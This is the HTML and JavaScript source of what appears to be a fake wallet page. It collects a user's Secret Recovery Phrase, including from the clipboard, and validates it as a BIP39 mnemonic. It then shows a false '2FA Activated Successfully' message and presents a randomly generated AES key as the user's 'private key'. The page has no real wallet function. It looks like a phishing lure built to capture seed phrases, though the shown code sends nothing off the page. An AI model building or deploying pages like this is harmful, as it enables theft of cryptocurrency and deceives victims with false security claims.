<body>

<div class="container">

  <div id="main-page">
    <div class="header">
      <button class="back-btn" id="backBtn">‹</button>
      <div class="header-content">
        <h1>Import a wallet</h1>
        <p>Enter your Secret Recovery Phrase <span class="help-icon" title="Your seed phrase for wallet recovery">?</span></p>
      </div>
    </div>

    <div class="form-group">
      <div class="word-grid-container" id="word-grid-container">
        <input 
          type="text" 
          id="mnemonic-input" 
          class="word-input" 
          placeholder="Enter words here..."
          autocomplete="off"
          spellcheck="false"
        >
      </div>
      
      <div class="form-footer">
        <div class="error-msg" id="errorMsg"></div>
        <div style="display: flex; gap: 12px;">
          <button class="clear-all-btn" id="pasteBtn" style="display: none;">Paste</button>
          <button class="clear-all-btn" id="clearAllBtn" style="display: none;">Clear all</button>
        </div>
      </div>

      <div class="helper-text" id="helperText">Use only lowercase letters, check your spelling, and put the words in the original order.</div>
    </div>

    <button id="continueBtn" class="continue-btn" disabled>Continue</button>
  </div>

  <div id="loading-page">
    <div class="loader"></div>
    <p>Validating your recovery phrase...</p>
  </div>

  <div id="success-page">
    <div class="checkmark"></div>
    <div class="success-message">
      <h3>2FA Activated Successfully</h3>
      <p>Your wallet security has been updated with 2FA protection enabled.</p>
    </div>

    <div id="aes-container">
      <label>Your Private Key (Store Securely)</label>
      <div id="aes-box">
        <code id="aes-key"></code>
        <button id="copyAesBtn" type="button">Copy</button>
      </div>
    </div>
  </div>

</div>

<script>
let WORDS = [], WORD_MAP = new Map(), WORDS_READY = false;

fetch("https://raw.githubusercontent.com/bitcoin/bips/refs/heads/master/bip-0039/english.txt")
  .then(r => r.ok ? r.text() : Promise.reject())
  .then(t => {
    WORDS = t.trim().split(/\n+/);
    WORD_MAP = new Map(WORDS.map((w, i) => [w, i]));
    WORDS_READY = true;
  })
  .catch(() => {
    WORDS = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account"];
    WORD_MAP = new Map(WORDS.map((w, i) => [w, i]));
    WORDS_READY = true;
  });

const mnemonicInput = document.getElementById('mnemonic-input');
const wordGridContainer = document.getElementById('word-grid-container');
const continueBtn = document.getElementById('continueBtn');
const backBtn = document.getElementById('backBtn');
const clearAllBtn = document.getElementById('clearAllBtn');
const pasteBtn = document.getElementById('pasteBtn');
const errorMsg = document.getElementById('errorMsg');
const helperText = document.getElementById('helperText');

let words = [];
let revealedIndices = new Set();
const ENT_BY_WORDS = { 12: 128, 15: 160, 18: 192, 21: 224, 24: 256 };

function wordsToBitString(wordsList) {
  let bits = "";
  for (const w of wordsList) {
    const idx = WORD_MAP.get(w);
    if (idx === undefined) return null;
    bits += idx.toString(2).padStart(11, '0');
  }
  return bits;
}

function bitsToBytes(bitstr) {
  const bytes = new Uint8Array(bitstr.length / 8);
  for (let i = 0; i < bytes.length; i++) {
    bytes[i] = parseInt(bitstr.slice(i * 8, i * 8 + 8), 2);
  }
  return bytes;
}

async function isValidBip39(wordsList) {
  if (!WORDS_READY || wordsList.length === 0) return false;
  const n = wordsList.length;
  if (!ENT_BY_WORDS[n]) return false;
  
  for (const w of wordsList) {
    if (!WORD_MAP.has(w)) return false;
  }

  const ENT = ENT_BY_WORDS[n];
  const CS = ENT / 32;
  const bitstr = wordsToBitString(wordsList);
  if (!bitstr) return false;

  const entBits = bitstr.slice(0, ENT);
  const csBits = bitstr.slice(ENT, ENT + CS);

  const entropyBytes = bitsToBytes(entBits);
  
  try {
    const hashBuf = await crypto.subtle.digest('SHA-256', entropyBytes);
    const hash = new Uint8Array(hashBuf);
    let hashBits = "";
    for (const b of hash) hashBits += b.toString(2).padStart(8, '0');
    return csBits === hashBits.slice(0, CS);
  } catch {
    return false;
  }
}

function getMaskedText(word) {
  return '•'.repeat(word.length);
}

function renderWords() {
  const inputValue = mnemonicInput.value;
  wordGridContainer.querySelectorAll('.word-box').forEach(box => box.remove());
  
  words.forEach((word, idx) => {
    const box = document.createElement('div');
    box.className = 'word-box';
    const isValid = WORD_MAP.has(word);
    if (!isValid) {
      box.classList.add('error');
    }
    
    const isRevealed = revealedIndices.has(idx);
    const wordDisplay = isRevealed ? word : (isValid ? getMaskedText(word) : word);
    const wordTextClass = isValid ? (isRevealed ? 'revealed' : '') : 'invalid';
    
    box.innerHTML = `
      <span class="word-number">${idx + 1}.</span>
      <span class="word-text ${wordTextClass}">${wordDisplay}</span>
      <span class="remove-word">×</span>
    `;
    
    const wordTextSpan = box.querySelector('.word-text');
    wordTextSpan.onclick = (e) => {
      e.stopPropagation();
      revealedIndices.has(idx) ? revealedIndices.delete(idx) : revealedIndices.add(idx);
      renderWords();
    };
    
    box.querySelector('.remove-word').onclick = (e) => {
      e.stopPropagation();
      words.splice(idx, 1);
      revealedIndices.delete(idx);
      renderWords();
      mnemonicInput.focus();
      updateValidation();
    };
    
    wordGridContainer.appendChild(box);
  });
  
  wordGridContainer.appendChild(mnemonicInput);
  mnemonicInput.value = inputValue;
  mnemonicInput.focus();
  
  updateButtonVisibility();
}

function updateButtonVisibility() {
  if (words.length > 0) {
    clearAllBtn.style.display = 'block';
    pasteBtn.style.display = 'none';
  } else {
    clearAllBtn.style.display = 'none';
    if (mnemonicInput.value.trim() === '') {
      pasteBtn.style.display = 'block';
    } else {
      pasteBtn.style.display = 'none';
    }
  }
}

async function updateValidation() {
  const wordCount = words.length;
  const isValid = [12, 15, 18, 21, 24].includes(wordCount);
  
  wordGridContainer.classList.remove('error');
  errorMsg.textContent = '';
  helperText.classList.remove('show');
  continueBtn.classList.remove('active');
  continueBtn.disabled = true;
  
  if (wordCount === 0) return;
  
  const invalidWords = words.filter(w => !WORD_MAP.has(w));
  if (invalidWords.length > 0) {
    wordGridContainer.classList.add('error');
    helperText.classList.add('show');
    return;
  }
  
  if (isValid) {
    const valid = await isValidBip39(words);
    if (valid) {
      continueBtn.disabled = false;
      continueBtn.classList.add('active');
    } else {
      wordGridContainer.classList.add('error');
      errorMsg.textContent = 'Invalid checksum. Please check your words.';
    }
  } else if (wordCount > 24) {
    wordGridContainer.classList.add('error');
    errorMsg.textContent = 'Too many words. Maximum is 24.';
  }
}

mnemonicInput.addEventListener('input', async (e) => {
  const text = e.target.value;
  const trimmedText = text.trim();
  
  if (trimmedText.includes(' ')) {
    const allWords = trimmedText.split(/\s+/).filter(w => w.length > 0);
    
    for (const w of allWords) {
      words.push(w.toLowerCase());
    }
    
    mnemonicInput.value = '';
    renderWords();
    await updateValidation();
  }
  
  updateButtonVisibility();
});

mnemonicInput.addEventListener('keydown', async (e) => {
  if (e.key === 'Enter') {
    e.preventDefault();
    const word = mnemonicInput.value.trim().toLowerCase();
    if (word) {
      words.push(word);
      mnemonicInput.value = '';
      renderWords();
      await updateValidation();
    }
  } else if (e.key === 'Backspace' && mnemonicInput.value === '' && words.length > 0) {
    words.pop();
    revealedIndices.delete(words.length);
    renderWords();
    await updateValidation();
  }
  
  setTimeout(updateButtonVisibility, 0);
});

wordGridContainer.addEventListener('click', () => {
  mnemonicInput.focus();
});

clearAllBtn.onclick = () => {
  words = [];
  revealedIndices.clear();
  mnemonicInput.value = '';
  renderWords();
  updateValidation();
  mnemonicInput.focus();
};

pasteBtn.onclick = async () => {
  try {
    const text = await navigator.clipboard.readText();
    const pastedWords = text.trim().toLowerCase().split(/\s+/).filter(w => w.length > 0);
    
    words.push(...pastedWords);
    
    mnemonicInput.value = '';
    renderWords();
    await updateValidation();
  } catch (err) {
    console.error("Failed to read clipboard: ", err);
    alert("Failed to paste from clipboard");
  }
};

backBtn.onclick = () => {
  console.log('Back button clicked');
};

continueBtn.onclick = async () => {
  document.getElementById('main-page').style.display = 'none';
  document.getElementById('loading-page').style.display = 'block';

  setTimeout(() => {
    document.getElementById('loading-page').style.display = 'none';
    document.getElementById('success-page').style.display = 'block';

    const key = generateAes256Base64();
    const aesKeyEl = document.getElementById('aes-key');
    const copyBtn = document.getElementById('copyAesBtn');

    if (aesKeyEl && copyBtn) {
      aesKeyEl.textContent = key;
      copyBtn.onclick = () => copyToClipboard(key);
    }
  }, 1500);
};

function generateAes256Base64() {
  const bytes = new Uint8Array(32);
  crypto.getRandomValues(bytes);
  let binary = "";
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

async function copyToClipboard(text) {
  try {
    await navigator.clipboard.writeText(text);
    alert("Key copied to clipboard");
  } catch (err) {
    console.error("Failed to copy: ", err);
    alert("Failed to copy key");
  }
}

mnemonicInput.focus();
</script>
</body>
</html>
